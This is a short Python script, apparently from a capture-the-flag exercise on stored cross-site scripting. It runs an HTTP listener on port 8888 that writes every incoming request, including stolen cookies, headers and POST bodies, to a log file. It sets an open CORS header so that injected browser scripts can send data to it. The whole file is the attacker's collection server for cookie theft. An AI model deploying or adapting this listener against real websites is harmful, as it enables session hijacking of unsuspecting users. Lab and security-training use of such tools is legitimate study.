#!/usr/bin/env python3
"""Listener for stored-XSS exfiltration (breach: stored-xss-cookie-theft-flag).

Listens on 0.0.0.0:8888 and logs decoded requests (GET/POST, including
exfiltrated cookies) to ./hits.log.
"""
import http.server, socketserver, datetime, urllib.parse

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        with open('hits.log', 'a') as f:
            f.write(f"{datetime.datetime.now()} {self.client_address[0]} {fmt % args}\n")

    def log_request(self, code='-', size='-'):
        pass

    def do_GET(self):
        with open('hits.log', 'a') as f:
            f.write(f"{datetime.datetime.now()} GET {urllib.parse.unquote(self.path)} from "
                    f"{self.client_address[0]} headers={dict(self.headers)}\n")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'ok')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        with open('hits.log', 'a') as f:
            f.write(f"{datetime.datetime.now()} POST {self.path} from "
                    f"{self.client_address[0]} body={body}\n")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'ok')

socketserver.TCPServer.allow_reuse_address = True

with socketserver.TCPServer(('0.0.0.0', 8888), H) as httpd:
    httpd.serve_forever()
